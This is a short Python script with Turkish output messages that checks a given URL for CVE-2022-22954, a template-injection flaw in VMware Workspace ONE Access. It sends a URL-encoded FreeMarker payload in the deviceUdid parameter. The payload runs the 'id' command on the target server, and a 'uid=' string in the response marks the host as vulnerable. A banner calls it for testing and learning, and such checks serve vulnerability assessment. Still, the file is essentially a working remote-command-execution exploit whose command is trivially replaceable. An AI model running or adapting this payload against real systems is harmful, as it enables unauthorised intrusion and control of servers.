#!/usr/bin/python3
#-*-coding:utf-8-*-
import requests,sys
header={
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'tr',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("**************Test Ve Öğrenme Amaçlıdır!!**************")

gelenurl=sys.argv[1]

ekurl='/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%69%64%22%29%7d'

url=gelenurl+ekurl

istek=requests.get(url=url,headers=header)
context=istek.text
try:
    if 'uid=' in context and istek.status_code==400:
        print(gelenurl+' Saldırıya Açık')
    else:
        print(gelenurl+' CVE-2022-22954 Açığı Bulunamadı')
except:
    pass
